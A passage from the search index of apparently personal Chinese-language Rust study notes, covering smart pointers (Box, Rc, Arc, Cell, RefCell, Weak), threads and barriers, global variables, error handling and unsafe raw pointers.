trait"},{"location":"cs/pl/rust/basic/#box","text":"Box<T> \u5141\u8bb8\u5c06\u4e00\u4e2a\u503c\u5206\u914d\u5230\u5806\u4e0a\uff0c\u7136\u540e\u5728\u6808\u4e0a\u4fdd\u7559\u4e00\u4e2a\u667a\u80fd\u6307\u9488\u6307\u5411\u5806\u4e0a\u6570\u636e \u53ef\u4ee5\u5c06\u6570\u636e\u5206\u914d\u5230\u5806\u4e0a let a = Box :: new ( 3 ); println! ( \"a = {}\" , a ); // \u5229\u7528 Deref \u81ea\u52a8\u89e3\u5f15\u7528 let b = * a + 1 ; // \u8868\u8fbe\u5f0f\u4e2d\u9700\u8981\u624b\u52a8\u89e3\u5f15\u7528 \u4f46\u662f Box::new \u4f1a\u5148\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\u7136\u540e\u79fb\u5230\u5806\u4e0a\uff0c\u6bd4\u5982 Box::new([0; 1000000000000]) \u4f1a\u62a5\u9519\u6808\u6ea2\u51fa \u907f\u514d\u6808\u4e0a\u6570\u636e\u62f7\u8d1d \u6808\u4e0a\u6570\u636e\u6240\u6709\u6743\u8f6c\u79fb\u7684\u65f6\u5019\u4f1a\u62f7\u8d1d\u4e00\u4efd\u6570\u636e\uff0c\u4f46\u5728\u5806\u4e0a\u65f6\u5806\u4e0a\u6570\u636e\u4e0d\u4f1a\u62f7\u8d1d\uff0c\u4ec5\u4ec5\u9700\u8981\u62f7\u8d1d\u4e00\u4efd\u6808\u4e0a\u7684\u6307\u9488\u5373\u53ef\u5b8c\u6210\u6240\u6709\u6743\u8f6c\u79fb \u5c06 DST \u53d8\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7c7b\u578b \u5982\u9012\u5f52\u7c7b\u578b\uff0crust \u4e0d\u77e5\u9053\u9012\u5f52\u7c7b\u578b\u9700\u8981\u591a\u5c11\u7a7a\u95f4\uff0c\u4f46\u5305\u88f9\u4e00\u5c42 Box \u5219\u53ef\u4ee5\u53d8\u6210\u56fa\u5b9a\u5927\u5c0f enum List { Cons ( i32 , Box < List > ), Nil , } \u5c06\u7279\u5f81\u8f6c\u4e3a\u7279\u5f81\u5bf9\u8c61 Box::leak \u6d88\u8d39\u6389 Box\uff0c\u5e76\u5f3a\u5236\u76ee\u6807\u503c\u4ece\u5185\u5b58\u4e2d\u6cc4\u9732 \u4f8b\u5982\u5c06 String \u7c7b\u578b\u53d8\u6210\u62e5\u6709 'static \u751f\u547d\u5468\u671f\u7684 &str \u7c7b\u578b fn func () -> & ' static str { let mut s = String :: new (); s . push_str ( \"...\" ); Box :: leak ( s . into_boxed_str ()) }","title":"Box"},{"location":"cs/pl/rust/basic/#rc-arc","text":"Rc \u5373\u5f15\u7528\u8ba1\u6570\uff08reference counting\uff09\uff0c\u8bb0\u5f55\u4e00\u4e2a\u6570\u636e\u88ab\u5f15\u7528\u7684\u6b21\u6570\u6765\u786e\u5b9a\u6570\u636e\u662f\u5426\u88ab\u4f7f\u7528\uff0c\u5f53\u5f15\u7528\u6b21\u6570\u5f52\u96f6\uff0c\u5219\u6e05\u7406\u91ca\u653e \u4f7f\u7528 clone \u6765\u590d\u5236\u667a\u80fd\u6307\u9488\u5e76\u589e\u52a0\u5f15\u7528\u8ba1\u6570 use std :: rc :: Rc let a = Rc :: new ( String :: from ( \"...\" )); let b = Rc :: clone ( & a ); assert_eq! ( 2 , Rc :: strong_count ( & a )); assert_eq! ( 2 , Rc :: strong_count ( & b )); \u4f7f\u7528 Rc::strong_count \u6765\u83b7\u53d6\u8ba1\u6570 Rc \u5728\u79bb\u5f00\u4f5c\u7528\u57df\u65f6\u4f1a\u88ab\u91ca\u653e\uff0c\u5e76\u5c06\u5f15\u7528\u6570\u636e\u7684\u8ba1\u6570\u51cf\u4e00 Rc \u662f\u6307\u5411\u5e95\u5c42\u6570\u636e\u7684\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u65e0\u6cd5\u901a\u8fc7\u5b83\u6765\u4fee\u6539\u6570\u636e Rc \u53ea\u80fd\u7528\u5728\u540c\u4e00\u7ebf\u7a0b\u5185\u90e8\uff0c\u591a\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u9700\u8981\u4f7f\u7528 Arc\uff08Atomic Rc\uff09\uff0c\u5176 api \u4e00\u81f4\u4f46\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u4e0d\u8fc7\u6548\u7387\u4f1a\u6709\u6240\u964d\u4f4e \u9700\u8981 use std :: sync :: Arc","title":"Rc \u4e0e Arc"},{"location":"cs/pl/rust/basic/#cell-refcell","text":"Cell<T> \u9002\u7528\u4e8e T \u5b9e\u73b0 Copy \u7684\u60c5\u51b5\uff0c\u800c\u6ca1\u6709 Copy \u7684\u8bdd\u5219\u4e0d\u80fd\u4f7f\u7528 Cell \u53ea\u80fd\u4f7f\u7528 RefCell\u3002\u4e8c\u8005\u90fd\u53ef\u4ee5\u8fbe\u5230\u5185\u90e8\u53ef\u53d8\u6027\u7684\u6548\u679c Rust \u89c4\u5b9a\u4e00\u4e2a\u7ed3\u6784\u4f53\u4e2d\u7684\u5b57\u6bb5\u8981\u4e48\u90fd\u662f immutable \u8981\u4e48\u90fd\u662f mutable\uff0c\u800c\u4e0d\u80fd\u5c06\u90e8\u5206\u5b57\u6bb5\u6807\u8bb0\u4e3a mutable\u3002\u4f46\u53ef\u4ee5\u4f7f\u7528 Cell \u6216 RefCell \u5305\u88f9\u60f3\u8981\u53ef\u53d8\u7684\u5b57\u6bb5\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86 immutable \u7ed3\u6784\u4f53\u4e2d\u90e8\u5206\u5b57\u6bb5\u53ef\u53d8\u7684\u6548\u679c\u800c\u4e0d\u5fc5\u5c06\u6574\u4e2a\u7ed3\u6784\u4f53\u6807\u8bb0\u4e3a mutable","title":"Cell \u4e0e RefCell"},{"location":"cs/pl/rust/basic/#cell","text":"use std :: cell :: Cell ; .get() \u53d6\u503c\uff08Copy \u51fa\u6765\uff09 \u53ef\u4ee5\u4f7f\u7528 .set() \u8bbe\u7f6e\u65b0\u503c\u800c\u4e0d\u9700\u8981\u5c06\u5176\u6807\u8bb0\u4e3a mut let c = Cell :: new ( \"abcd\" ); let a = c . get (); c . set ( \"efgh\" ); let b = c . get (); println! ( \"{} {}\" , a , b ); // abcd efgh \u4f8b\uff1a \u4e0b\u9762\u4ee3\u7801\u4f1a\u62a5\u9519\uff1a let mut x = 1 ; let y = & mut x ; let z = & mut x ; x = 2 ; * y = 3 ; * z = 4 ; println! ( \"{}\" , x ); \u800c\u4e0b\u9762\u7684\u4e0d\u4f1a\uff1a let x = Cell :: new ( 1 ); let y = & x ; let z = & x ; x . set ( 2 ); y . set ( 3 ); z . set ( 4 ); println! ( \"{}\" , x . get ()); \u8fd9\u91cc x \u4e5f\u4e0d\u5fc5\u58f0\u660e\u4e3a mut\uff0cy z \u90fd\u662f x \u7684\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u53ef\u4ee5\u5171\u5b58 \u4f46\u53ef\u4ee5\u901a\u8fc7 x y z \u6765\u6539\u53d8 cell \u4e2d\u7684\u503c Cell \u6ca1\u6709\u6027\u80fd\u635f\u8017 Rust 1.37 \u4e2d\u589e\u52a0\u4e86\u4e24\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u597d\u5730\u89e3\u51b3\u501f\u7528\u51b2\u7a81\uff1a Cell::from_mut\uff0c\u5c06 &mut T \u8f6c\u4e3a &Cell<T> Cell::as_slice_of_cells\uff0c\u5c06 &Cell<[T]> \u8f6c\u4e3a &[Cell<T>]","title":"Cell"},{"location":"cs/pl/rust/basic/#refcell","text":"use std :: cell :: RefCell ; \u53ef\u4ee5\u4f7f\u7f16\u8bd1\u671f\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u5171\u5b58 \u4f7f\u7528\u65f6\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e00\u6837\u4e0d\u80fd\u5171\u5b58\uff0c\u4f1a panic\uff0c\u5e76\u4e0d\u80fd\u4f9d\u6b21\u7ed5\u8fc7\u501f\u7528\u89c4\u5219 \u4e0e Cell \u63d0\u4f9b\u503c\u76f8\u6bd4\uff0cRefCell \u63d0\u4f9b\u5f15\u7528 .borrow() \u521b\u5efa\u4e0d\u53ef\u53d8\u5f15\u7528\u3001.borrow_mut() \u521b\u5efa\u53ef\u53d8\u5f15\u7528 RefCell \u9002\u7528\u4e8e\u7f16\u8bd1\u671f\u8bef\u62a5\u6216\u8005\u4e00\u4e2a\u5f15\u7528\u5728\u591a\u5904\u4f7f\u7528\u96be\u4ee5\u7ba1\u7406\u501f\u7528\u5173\u7cfb\u65f6 \u53ef\u4ee5\u5229\u7528 RefCell \u6765\u521b\u5efa\u4e00\u4e2a\u4e0d\u662f mut \u4f46\u662f\u5185\u90e8\u503c\u53ef\u53d8\u7684\u4e1c\u897f use std :: cell :: RefCell ; pub trait Messenger { fn send ( & self , msg : String ); // \u5b9a\u4e49\u65f6\u4e0d\u662f &mut self } pub struct MsgQueue { msg_cache : RefCell < Vec < String >> , } impl Messenger for MsgQueue { fn send ( & self , msg : String ) { self . msg_cache . borrow_mut (). push ( msg ) // self \u4e0d\u662f mut \u7684\uff0cmsg_cache \u4e5f\u5c31\u4e0d\u662f mut \u7684 } } Rc \u548c RefCell \u7ec4\u5408\u4f7f\u7528\uff0c\u53ef\u4ee5\u540c\u65f6\u62e5\u6709\u591a\u4e2a\u6240\u6709\u8005\u5e76\u5b9e\u73b0\u6570\u636e\u7684\u53ef\u53d8\u6027\uff1a use std :: cell :: RefCell ; use std :: rc :: Rc ; fn main () { let s = Rc :: new ( RefCell :: new ( \"...\" . to_string ())); let s1 = s . clone (); let s2 = s . clone (); s2 . borrow_mut (). push_str ( \"...\" ); println! ( \"{:?} \\n {:?} \\n {:?}\" , s , s1 , s2 ); } \u4f1a\u8f93\u51fa\u4e09\u904d RefCell { value: \"......\" } \u7ec4\u5408\u4f7f\u7528\u6027\u80fd\u5176\u5b9e\u5f88\u9ad8","title":"RefCell"},{"location":"cs/pl/rust/basic/#weak","text":"use std :: rc :: Weak \u4f7f\u7528 Rc \u914d\u5408 RefCell \u4f1a\u6784\u9020\u51fa\u4e24\u4e2a\u6307\u9488\u4e92\u76f8\u6307\u4e5f\u5c31\u662f\u5faa\u73af\u5f15\u7528\u7684\u60c5\u51b5\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u5f15\u7528\u8ba1\u6570\u65e0\u6cd5\u6e05\u96f6\u4e0d\u4f1a drop \u4ece\u800c\u9020\u6210\u5185\u5b58\u6cc4\u6f0f \u4f7f\u7528 Weak \u53ef\u4ee5\u89e3\u51b3\u5faa\u73af\u5f15\u7528\u7684\u95ee\u9898\uff0c\u5b83\u5e76\u4e0d\u4fdd\u8bc1\u5f15\u7528\u5173\u7cfb\u4f1a\u5b58\u5728\uff0c\u4e0e Rc \u76f8\u6bd4\uff0c\u5b83\u7684\u7279\u70b9\uff1a \u4e0d\u4f1a\u8ba1\u6570 \u4e0d\u62e5\u6709\u503c\u7684\u6240\u6709\u6743 \u4e0d\u4f1a\u963b\u6b62\u503c\u7684\u91ca\u653e\uff08Rc \u53ea\u6709\u5f53\u8ba1\u6570\u4e3a 0 \u65f6\u624d\u80fd drop\uff09 Weak \u5728\u4f7f\u7528\u65f6\u9700\u8981\u5148\u8c03\u7528 upgrade \u65b9\u6cd5\u5f97\u5230\u4e00\u4e2a Option<Rc<T>> \u7c7b\u578b\u7684\u503c\uff08\u5f53\u5f15\u7528\u503c\u5b58\u5728\u65f6\u8fd4\u56de Some(rc)\uff0c\u53d6\u51fa Rc \u4f7f\u7528\uff0c\u4e0d\u5b58\u5728\u65f6\u8fd4\u56de None\uff09 \u5728 Rc<T> \u4e0a\u8c03\u7528 downgrade \u65b9\u6cd5\u5373\u53ef\u83b7\u5f97 Weak<T>\uff0c\u540c\u65f6\u4f1a\u8ba1\u5165\u5230\u8be5 Rc \u7684\u4e00\u4e2a weak_count \u4e0a \u5f53\u4f1a\u9020\u6210\u5faa\u73af\u5f15\u7528\u65f6\uff0c\u5c06\u5176\u4e2d\u4e00\u652f\u6362\u4e3a Weak \u5373\u53ef\u907f\u514d","title":"Weak \u5f31\u5f15\u7528"},{"location":"cs/pl/rust/basic/#_62","text":"","title":"\u591a\u7ebf\u7a0b\u5e76\u53d1\u7f16\u7a0b"},{"location":"cs/pl/rust/basic/#_63","text":"\u521b\u5efa\u7ebf\u7a0b \u4f7f\u7528 std::thread::spawn \u521b\u5efa\u7ebf\u7a0b \u7ebf\u7a0b\u5185\u90e8\u4ee3\u7801\u4f7f\u7528\u95ed\u5305\u6765\u6267\u884c main \u7ebf\u7a0b\u7ed3\u675f\u5219\u7a0b\u5e8f\u7acb\u5373\u7ed3\u675f\u4e0d\u4f1a\u7b49\u5230\u5b50\u7ebf\u7a0b\u5168\u90e8\u7ed3\u675f thread::sleep \u4f11\u7720\u5f53\u524d\u7ebf\u7a0b\u6307\u5b9a\u65f6\u95f4 use std :: thread ; use std :: time :: Duration ; fn main () { thread :: spawn ( || { for i in 1 .. 10 { println! ( \"hi number {} from the spawned thread!\" , i ); thread :: sleep ( Duration :: from_millis ( 1 )); } }); for i in 1 .. 5 { println! ( \"hi number {} from the main thread!\" , i ); thread :: sleep ( Duration :: from_millis ( 1 )); } } \u7b49\u5f85\u5b50\u7ebf\u7a0b\u7ed3\u675f spawn \u4f1a\u8fd4\u56de\u4e00\u4e2a JoinHandle<()> \u7c7b\u578b\u7684\u503c\uff0c\u53ef\u4ee5\u5728\u5176\u4e0a\u8c03\u7528 .join \u65b9\u6cd5\u6765\u963b\u585e\u5f53\u524d\u7ebf\u7a0b let handle = thread :: spawn ( .. .) handle . join (). unwrap (); \u7ebf\u7a0b\u95ed\u5305\u4e2d\u6355\u83b7\u53d8\u91cf \u521b\u5efa\u7ebf\u7a0b\u7684\u95ed\u5305\u4e2d\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u5f53\u524d\u7ebf\u7a0b\u4e2d\u7684\u53d8\u91cf\uff0c\u56e0\u4e3a\u65e0\u6cd5\u786e\u5b9a\u521b\u5efa\u7684\u65b0\u7ebf\u7a0b\u4f1a\u5b58\u6d3b\u591a\u4e45\uff0c\u53ef\u80fd\u5728\u501f\u7528\u53d8\u91cf\u521b\u5efa\u65b0\u7ebf\u7a0b\uff0c\u5728\u65b0\u7ebf\u7a0b\u8fd0\u884c\u65f6\uff0c\u501f\u7528\u7684\u539f\u503c\u5df2\u7ecf\u88ab drop \u56e0\u6b64\u4f7f\u7528\u6355\u83b7\u53d8\u91cf\u7684\u8bdd\u4e00\u5b9a\u8981\u5728\u53c2\u6570\u5217\u8868\u524d\u52a0\u4e0a move \u5173\u952e\u5b57\u6765\u5f3a\u5236\u8f6c\u79fb\u6240\u6709\u6743\uff08\u4e5f\u5c31\u662f\u8bf4\u5f53\u524d\u7ebf\u7a0b\u540e\u9762\u5c06\u4e0d\u53ef\u4ee5\u5728\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\uff09 barrier \u5728\u591a\u4e2a\u7ebf\u7a0b\u5185\u540c\u6b65\uff0c\u5373\u7b49\u5f85\u5404\u7ebf\u7a0b\u6267\u884c\u5230\u540c\u4e00\u4f4d\u7f6e\u540e\u518d\u7ee7\u7eed\u6267\u884c \u4f7f\u7528 std::sync::Barrier\uff0c\u9700\u8981\u901a\u8fc7 Arc \u6765\u5206\u914d\u5230\u5404\u4e2a\u7ebf\u7a0b\u4e2d \u8c03\u7528\u5176 .wait() \u65b9\u6cd5\u6765\u5bf9\u6240\u6709\u4f7f\u7528\u4e86 barrier \u5bf9\u7ebf\u7a0b\u8fdb\u884c\u540c\u6b65 use std :: sync :: { Arc , Barrier }; use std :: thread ; fn main () { let mut handles = Vec :: with_capacity ( 6 ); let barrier = Arc :: new ( Barrier :: new ( 6 )); for _ in 0 ..= 5 { let b = barrier . clone (); handles . push ( thread :: spawn ( move || { println! ( \"before wait\" ); b . wait (); println! ( \"after wait\" ); })) } for handle in handles { handle . join (). unwrap (); } } \u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf \u6807\u51c6\u5e93 thread_local \u5b8f \u901a\u8fc7\u5b8f\u6765\u521b\u5efa\u4e00\u4e2a\u751f\u547d\u5468\u671f\u4e3a 'static \u7684\u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf \u6bcf\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u65f6\u90fd\u4f1a\u4f7f\u7528\u5b83\u7684\u521d\u59cb\u503c\uff0c\u4e14\u5404\u7ebf\u7a0b\u95f4\u5f7c\u6b64\u4e0d\u5e72\u6270 \u7ebf\u7a0b\u5185\u90e8\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\u7684 with \u65b9\u6cd5\u6765\u83b7\u53d6\u503c\u8fdb\u884c\u64cd\u4f5c use std :: cell :: RefCell ; use std :: thread ; thread_local! ( static FOO : RefCell < u32 > = RefCell :: new ( 1 )); FOO . with ( | f | { .. . }) thread :: spawn ( move || { FOO . with ( | f | { .. . }) }). join (). unwrap (); \u7b2c\u4e09\u65b9\u5e93 thread-local TODO\uff1a\u6b47\u903c\u4e86\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u6709\u8010\u5fc3\u4e86\u518d\u770b\u591a\u7ebf\u7a0b","title":"\u4f7f\u7528\u7ebf\u7a0b"},{"location":"cs/pl/rust/basic/#_64","text":"\u7f16\u8bd1\u671f\u521d\u59cb\u5316 \u9759\u6001\u5e38\u91cf \u4f7f\u7528 const \u5b9a\u4e49\uff0c\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u4e00\u822c\u5168\u5927\u5199 \u53ef\u4ee5\u5728\u4efb\u610f\u4f5c\u7528\u57df\u5b9a\u4e49\uff0c\u751f\u547d\u5468\u671f\u8d2f\u7a7f\u6574\u4e2a\u7a0b\u5e8f \u8d4b\u503c\u53ea\u80fd\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u8ba1\u7b97\u7684\u8868\u8fbe\u5f0f \u4e0d\u5141\u8bb8\u51fa\u73b0\u91cd\u590d\u5b9a\u4e49 \u9759\u6001\u53d8\u91cf \u4f7f\u7528 static \u5b9a\u4e49\uff0c\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u4e00\u822c\u5168\u5927\u5199 \u5fc5\u987b\u4f7f\u7528 unsafe \u8bed\u53e5\u5757\u624d\u80fd\u8bbf\u95ee\u548c\u4fee\u6539 static \u53d8\u91cf \u53ea\u6709\u5728\u540c\u4e00\u7ebf\u7a0b\u5185\u6216\u8005\u4e0d\u5728\u4e4e\u591a\u7ebf\u7a0b\u4e2d\u6570\u636e\u51c6\u786e\u6027\u65f6\u624d\u5e94\u8be5\u4f7f\u7528\u5168\u5c40\u9759\u6001\u53d8\u91cf \u8d4b\u503c\u53ea\u80fd\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u8ba1\u7b97\u7684\u8868\u8fbe\u5f0f \u9759\u6001\u53d8\u91cf\u4e0d\u4f1a\u88ab\u5185\u8054\uff0c\u4e14\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b \u5b58\u50a8\u5728\u9759\u6001\u53d8\u91cf\u4e2d\u7684\u503c\u9700\u8981\u5b9e\u73b0 Sync trait \u539f\u5b50\u7c7b\u578b \u53ef\u4ee5\u4f5c\u4e3a\u5168\u5c40\u8ba1\u6570\u5668\uff0c\u4e14\u662f\u7ebf\u7a0b\u5b89\u5168\u7684 use std :: sync :: atomic :: { AtomicUsize . Ordering }; static VAR : AtomicUsize = AtomicUsize :: new ( 0 ); fn main () { for _ in 0 .. 100 { VAR . fetch_add ( 1 , Ordering :: Relaxed ); } } \u8fd0\u884c\u671f\u521d\u59cb\u5316 \u4f7f\u7528 lazy_static \u5305\u4e2d\u7684 lazy_static \u5b8f \u4f7f\u7528 Box::leak","title":"\u5168\u5c40\u53d8\u91cf"},{"location":"cs/pl/rust/basic/#_65","text":"\u7ec4\u5408\u5668 .or() .and() \u5bf9\u4e24\u4e2a Option / Result \u8fdb\u884c\u7c7b\u4f3c\u5e03\u5c14\u7c7b\u578b\u7684\u64cd\u4f5c\u8fd4\u56de\u5176\u4e2d\u4e00\u4e2a\uff0c\u5982\uff1a None . or ( Some ( 1 )) // -> Some(1) Ok ( \"ok\" ). and ( Err ( \"err\" )) // -> Err(\"err\") .or_else() .and_then() \u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u662f\u4e00\u4e2a\u8fd4\u56de Option / Result \u7684\u95ed\u5305\uff0c\u5176\u4ed6\u548c or and \u7528\u6cd5\u4e00\u6837 .filter() \u53ef\u4ee5\u5bf9 Option \u8fdb\u884c\u8fc7\u6ee4 let s1 = Some ( 3 ); let s2 = Some ( 6 ); let n = None ; let fn_is_even = | x : & i8 | x % 2 == 0 ; assert_eq! ( s1 . filter ( fn_is_even ), n ); // Some(3) -> 3 is not even -> None assert_eq! ( s2 . filter ( fn_is_even ), s2 ); // Some(6) -> 6 is even -> Some(6) assert_eq! ( n . filter ( fn_is_even ), n ); // None -> no value -> None .map() .map_err() .map() \u6839\u636e\u95ed\u5305\u5c06 Some \u6216 Ok \u4e2d\u7684\u503c\u66f4\u6539\u4e3a\u53e6\u4e00\u4e2a Some ( \"...\" ). map ( | s : & str | s . chars (). count ()) // -> Some(3) .map_err() \u540c\u7406\uff0c\u662f\u5c06 Err \u4e2d\u7684\u503c\u66f4\u6539\u4e3a\u53e6\u4e00\u4e2a .map_or() .map_or_else() .map_or() \u5305\u542b\u4e24\u4e2a\u53c2\u6570\uff0c\u5f53\u8c03\u7528\u8005\u662f Ok / Some \u65f6\uff0c\u6267\u884c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d\u7684\u95ed\u5305\uff0c\u8fd4\u56de\u95ed\u5305\u7684\u8fd4\u56de\u503c\uff1b\u5f53\u8c03\u7528\u8005\u662f Err / None \u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u9ed8\u8ba4\u503c .map_or_else() \u7c7b\u4f3c map_or\uff0c\u4e0d\u8fc7\u7b2c\u4e00\u4e2a\u53c2\u6570\u5373\u9ed8\u8ba4\u503c\u4e5f\u4f7f\u7528\u95ed\u5305\u6765\u63d0\u4f9b .ok_or() .ok_or_else() .ok_or() \u5c06 Option \u8f6c\u6362\u4e3a Result Some ( 1 ). ok_or ( \"...\" ) // -> Ok(1) None . ok_or ( \"...\" ) // -> Err(\"...\") .ok_or_else() \u7c7b\u4f3c\uff0c\u4f46\u53c2\u6570\u7531\u95ed\u5305\u6765\u63d0\u4f9b \u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b std::error::Error trait \u5b9a\u4e49 use std :: fmt :: { Debug , Display }; pub trait Error : Debug + Display { fn source ( & self ) -> Option <& ( Error + ' static ) > { /* \u6709\u9ed8\u8ba4\u5b9e\u73b0 */ } } \u7531\u6b64\u53ef\u89c1\uff0c\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u53ea\u9700\u8981\u81ea\u52a8 derive Debug\uff0c\u7136\u540e\u624b\u52a8\u5b9e\u73b0\u4e00\u4e0b Display trait \u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b use std :: fmt ; #[derive(Debug)] struct MyError ; impl fmt :: Display for MyError { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"my error\" ) } } fn func () -> Result < (), MyError > { Err ( MyError ) } \u9519\u8bef\u8f6c\u6362 From trait #[derive(Debug)] struct MyError { message : String , } impl std :: fmt :: Display for MyError { .. . } impl From < io :: Error > for MyError { fn from ( error : io :: Error ) -> Self { MyError { message : error . to_string (), } } } \u8fd9\u6837\u5b9e\u73b0\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u5728 ? \u7684\u65f6\u5019\u652f\u6301\u81ea\u52a8\u5c06 io::Error \u8f6c\u6362\u6210 MyError \u5f52\u4e00\u5316\u9519\u8bef\u7c7b\u578b \u4f8b\u5982\u5c06 std::env::VarError \u548c std::io::Error \u5f52\u4e00\u5316\u4e3a\u540c\u4e00\u79cd\u7c7b\u578b \u53ef\u4ee5\u4f7f\u7528\u7279\u5f81\u5bf9\u8c61 \u53ef\u4ee5\u81ea\u5b9a\u4e49 enum \u9519\u8bef\u7c7b\u578b\uff0c\u4f46\u662f\u4ee3\u7801\u8f83\u590d\u6742 \u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 thiserror \u6765\u7b80\u5316\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u96c6\u5408 #[derive(thiserror::Error, Debug)] enum MyError { #[error( \"Environment variable not found\" )] EnvironmentVariableNotFound ( #[from] std :: env :: VarError ), #[error(transparent)] IOError ( #[from] std :: io :: Error ), } \u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 anyhow \u4e2d\u7684 anyhow::Result<T>\uff0c\u4e0d\u5173\u5fc3\u9519\u8bef\u6d88\u606f","title":"\u9519\u8bef\u5904\u7406"},{"location":"cs/pl/rust/basic/#unsafe","text":"unsafe \u4ee3\u7801\u5757\u6709\u4e94\u79cd\u80fd\u529b \u89e3\u5f15\u7528\u88f8\u6307\u9488 \u8c03\u7528\u4e00\u4e2a unsafe \u6216\u5916\u90e8\u7684\u51fd\u6570 \u8bbf\u95ee\u6216\u4fee\u6539\u4e00\u4e2a\u53ef\u53d8\u7684\u9759\u6001\u53d8\u91cf\uff08\u524d\u9762\u4ecb\u7ecd\u8fc7\u4e86\uff09 \u5b9e\u73b0\u4e00\u4e2a unsafe trait \u8bbf\u95ee union \u4e2d\u7684\u5b57\u6bb5 \u4f46 unsafe \u4ee3\u7801\u5757\u4ecd\u7136\u53d7 rust \u7684\u5b89\u5168\u652f\u6301\uff0c\u5b83\u5e76\u4e0d\u80fd\u7ed5\u8fc7 rust \u7684\u501f\u7528\u68c0\u67e5\uff0c\u4e5f\u4e0d\u80fd\u5173\u95ed\u4efb\u4f55 rust \u7684\u5b89\u5168\u68c0\u67e5","title":"unsafe"},{"location":"cs/pl/rust/basic/#_66","text":"\u88f8\u6307\u9488 \u88f8\u6307\u9488\u4e0d\u9002\u7528 Rust \u7684\u501f\u7528\u89c4\u5219\uff0c\u540c\u65f6\u62e5\u6709\u4e00\u4e2a\u6570\u636e\u7684\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u6307\u9488 \u88f8\u6307\u9488\u4e0d\u80fd\u4fdd\u8bc1\u6307\u5411\u5408\u6cd5\u7684\u5185\u5b58 \u88f8\u6307\u9488\u53ef\u4ee5\u662f null \u88f8\u6307\u9488\u6ca1\u6709\u5b9e\u73b0\u4efb\u4f55\u81ea\u52a8\u7684\u56de\u6536\uff08drop\uff09 \u88f8\u6307\u9488\u53ef\u4ee5\u4f7f\u7528\u52a0\u51cf\u6cd5\uff08\u5bf9\u5730\u5740\u64cd\u4f5c\uff09\uff0c\u4f46\u662f\u8fd9\u4e0d\u4f1a\u8003\u8651\u5355\u5143\u5927\u5c0f\uff0c\u5efa\u8bae\u5bf9\u88f8\u6307\u9488\u8c03\u7528 .add \u65b9\u6cd5\uff08\u4f1a\u81ea\u52a8\u4e58\u5355\u5143\u5927\u5c0f\uff09 \u521b\u5efa\u88f8\u6307\u9488 \u521b\u5efa\u88f8\u6307\u9488\u662f safe \u7684\uff0c\u4e0d\u9700\u8981\u5199\u5728 unsafe \u5757\u4e2d \u88f8\u6307\u9488\u6709\u4e24\u79cd\u5199\u6cd5\uff1a * const T \u548c * mut T \u5206\u522b\u8868\u793a T \u7c7b\u578b\u7684\u4e0d\u53ef\u53d8\u6307\u9488\u548c\u53ef\u53d8\u6307\u9488\uff08\u8fd9\u91cc\u7684 * \u4ec5\u4ec5\u662f\u8bb0\u53f7\uff0c\u4e0d\u8868\u793a\u89e3\u5f15\u7528\u7684\u542b\u4e49\uff09 \u57fa\u4e8e\u5f15\u7528\u521b\u5efa\u88f8\u6307\u9488 let mut num = 5 ; let r1 = & num as * const i32 ; let r2 = & mut num as * mut i32 ; \u57fa\u4e8e\u5185\u5b58\u5730\u5740\u521b\u5efa\u88f8\u6307\u9488 let address = 0x012345 usize ; let r = address as * const i32 ; \u76f8\u5f53\u5371\u9669\uff0c\u4f46\u521b\u5efa\u8fd9\u6837\u7684\u88f8\u6307\u9488\u4ecd\u7136\u662f safe \u7684\uff0c\u53ea\u8981\u4e0d\u89e3\u5f15\u7528 \u57fa\u4e8e\u667a\u80fd\u6307\u9488\u521b\u5efa\u88f8\u6307\u9488 let a : Box < i32 > = Box :: new ( 1 ); let b : * const i32 = &* a ; let c : * const i32 = Box :: into_raw ( a ) \u8c03\u7528\u65b9\u6cd5\u521b\u5efa\u88f8\u6307\u9488 \u4f8b\u5982 String \u7684 .as_ptr() \u548c .as_mut_ptr() \u65b9\u6cd5 \u89e3\u5f15\u7528\u88f8\u6307\u9488 \u5728 unsafe \u5757\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 * \u5bf9\u88f8\u6307\u9488\u8fdb\u884c\u89e3\u5f15\u7528","title":"\u89e3\u5f15\u7528\u88f8\u6307\u9488"},{"location":"cs/pl/rust/basic/#unsafe_1","text":"","title":"\u8c03\u7528 unsafe \u6216\u5916\u90e8\u51fd\u6570"},{"location":"cs/pl/rust/basic/#unsafe_2","text":"\u4f7f\u7528 unsafe fn 